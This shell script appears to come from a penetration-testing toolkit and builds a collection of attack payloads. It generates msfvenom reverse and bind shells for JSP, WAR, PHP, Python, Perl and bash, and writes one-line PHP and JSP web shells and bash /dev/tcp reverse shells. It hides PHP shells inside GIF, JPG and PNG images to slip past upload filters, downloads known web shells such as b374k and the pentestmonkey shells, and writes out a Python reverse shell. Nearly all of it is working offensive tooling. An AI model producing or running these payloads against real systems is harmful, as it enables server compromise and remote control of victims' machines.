# Reverse shell
banner "payloads_common: shell_reverse_tcp.jsp"
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$source_ip LPORT=$source_port EXITFUNC=thread -f raw > shell_reverse_tcp.jsp

banner "payloads_common: shell_reverse_tcp.war"
msfvenom -p java/shell/reverse_tcp LHOST=$source_ip LPORT=$source_port -f war > shell_reverse_tcp.war

banner "payloads_common: shell_reverse_tcp.php"
msfvenom -p php/reverse_php LHOST=$source_ip LPORT=$source_port -f raw > shell_reverse_tcp.php

banner "payloads_common: meterpreter_reverse_tcp.php"
msfvenom -p php/meterpreter_reverse_tcp LHOST=$source_ip LPORT=$source_port -f raw > meterpreter_reverse_tcp.php

banner "payloads_common: shell_reverse_unix.py"
msfvenom -p cmd/unix/reverse_python LHOST=$source_ip LPORT=$source_port -f raw > shell_reverse_unix.py

banner "payloads_common: shell_reverse_unix.pl"
msfvenom -p cmd/unix/reverse_perl LHOST=$source_ip LPORT=$source_port -f raw > shell_reverse_unix.pl

banner "payloads_common: shell_reverse_unix.sh"
msfvenom -p cmd/unix/reverse_bash LHOST=$source_ip LPORT=$source_port -f raw > shell_reverse_unix.sh

# Bind shell
banner "payloads_common: shell_bind_tcp.jsp"
msfvenom -p java/jsp_shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f raw > shell_bind_tcp.jsp

banner "payloads_common: shell_bind_tcp.war"
msfvenom -p java/shell/bind_tcp LPORT=$remote_port -f war > shell_bind_tcp.war

banner "payloads_common: shell_bind_tcp.php"
msfvenom -p php/bind_php LPORT=$remote_port -f raw > shell_bind_tcp.php

banner "payloads_common: meterpreter_bind_tcp.php"
msfvenom -p php/meterpreter_bind_tcp LPORT=$remote_port -f raw > meterpreter_bind_tcp.php

banner "payloads_common: shell_bind_unix.py"
msfvenom -p cmd/unix/bind_python LPORT=$remote_port -f raw > shell_bind_unix.py

banner "payloads_common: shell_bind_unix.pl"
msfvenom -p cmd/unix/bind_perl LPORT=$remote_port -f raw > shell_bind_unix.pl

# exec only returns the last line of the generated output.
# shell_exec returns the full output of the command, when the command finished running.
# system immediately shows all output, and is used to show text.
# passthru also returns output immediately, but is used for binary data. passthru displays raw data.

banner "payloads_common: simple php shells"
echo '<?php system($_GET["cmd"]); ?>' > system.php
echo '<?php echo shell_exec($_GET["cmd"]); ?>' > shell_exec.php
echo '<?php passthru($_GET["cmd"]); ?>' > passthru.php

echo "<?php echo shell_exec(\"bash -i >& /dev/tcp/$source_ip/$source_port 0>&1 2>&1\"); ?>" > shell_reverse_tcp.min.php
echo "<?php echo shell_exec(\"bash -i >& /dev/udp/$source_ip/$source_port 0>&1 2>&1\"); ?>" > shell_reverse_udp.min.php

banner "payloads_common: simple jsp shells"
echo "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>" > exec.jsp

banner "payloads_common: wpes.php - https://github.com/weaknetlabs/wpes"
wget -N https://raw.githubusercontent.com/weaknetlabs/wpes/master/wpes.php

banner "payloads_common: gif with php"
echo "GIF89;" > shell_exec.gif; cat shell_exec.php >> shell_exec.gif
echo "GIF89;" > system.gif; cat system.php >> system.gif
echo "GIF89;" > passthru.gif; cat passthru.php >> passthru.gif

# https://github.com/aureooms/pixels
banner "payloads_common: jpg with php"
wget -N https://github.com/aureooms/pixels/raw/master/1x1%23000000.jpg
cp 1x1%23000000.jpg shell_exec.jpg
exiftool -Comment="`cat shell_exec.php`" shell_exec.jpg
cp 1x1%23000000.jpg system.jpg
exiftool -Comment="`cat system.php`" system.jpg
cp 1x1%23000000.jpg passthru.jpg
exiftool -Comment="`cat passthru.php`" passthru.jpg
rm 1x1%23000000.jpg

banner "payloads_common: png with php"
wget -N https://github.com/aureooms/pixels/raw/master/1x1%23000000.png
cp 1x1%23000000.png shell_exec.png
exiftool -Comment="`cat shell_exec.php`" shell_exec.png
cp 1x1%23000000.png system.png
exiftool -Comment="`cat system.php`" system.png
cp 1x1%23000000.png passthru.png
exiftool -Comment="`cat passthru.php`" passthru.png
rm 1x1%23000000.png

banner "payloads_common: pentestmonkey-perl-reverse-shell.pl"
rm pentestmonkey-perl-reverse-shell.pl
wget https://raw.githubusercontent.com/pentestmonkey/perl-reverse-shell/master/perl-reverse-shell.pl -O pentestmonkey-perl-reverse-shell.pl
sed -i "s/127.0.0.1/$source_ip/g" pentestmonkey-perl-reverse-shell.pl
sed -i "s/1234/$source_port/g" pentestmonkey-perl-reverse-shell.pl

banner "payloads_common: pentestmonkey-php-reverse-shell.pl"
rm pentestmonkey-php-reverse-shell.pl
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O pentestmonkey-php-reverse-shell.pl
sed -i "s/127.0.0.1/$source_ip/g" pentestmonkey-php-reverse-shell.pl
sed -i "s/1234/$source_port/g" pentestmonkey-php-reverse-shell.pl

#wget https://github.com/pentestmonkey/php-findsock-shell/blob/master/findsock.c
#gcc -o findsock findsock.c
#wget https://raw.githubusercontent.com/pentestmonkey/php-findsock-shell/master/php-findsock-shell.php -O pentestmonkey-php-findsock-reverse-shell.pl


if [ ! -f b374k.php ]; then
    banner "payloads_common: b374k.php"
    wget https://github.com/b374k/b374k/archive/v3.2.3.zip
    wget -N -O b374k.zip mimi https://github.com`curl https://github.com/b374k/b374k/releases | grep "archive" | grep "zip" | head -1 | cut -d "\"" -f2`
    #Following call fails sometimes due to API rate limiting. Hence reading HTML. 
    #curl -s https://api.github.com/repos/b374k/b374k/releases/latest \
    # | grep "zipball_url.*zip" \
    # | cut -d : -f 2,3 \
    # | tr -d \" \
    # | tr -d , \
    # | wget -qi -O b374k.zip -
    unzip b374k.zip
    rm b374k.zip
    mv b374k-* b374k
    cp b374k/b374k.* .
    rm -rf b374k
fi

banner "payloads_common: automigrate.rc"
echo "run post/windows/manage/migrate" > automigrate.rc

banner "payloads_common: nodejsshell.py - https://github.com/ajinabraham/Node.Js-Security-Course"
wget -N https://raw.githubusercontent.com/ajinabraham/Node.Js-Security-Course/master/nodejsshell.py

banner "payloads_common: revserse_shell.py"
cat <<\EOT >revserse_shell.py
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("127.0.0.1",4444));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
EOT

sed -i "s/127.0.0.1/$source_ip/g" revserse_shell.py
sed -i "s/4444/$source_port/g" revserse_shell.py

wget -N https://raw.githubusercontent.com/tennc/webshell/master/jsp/jspbrowser/Browser.jsp
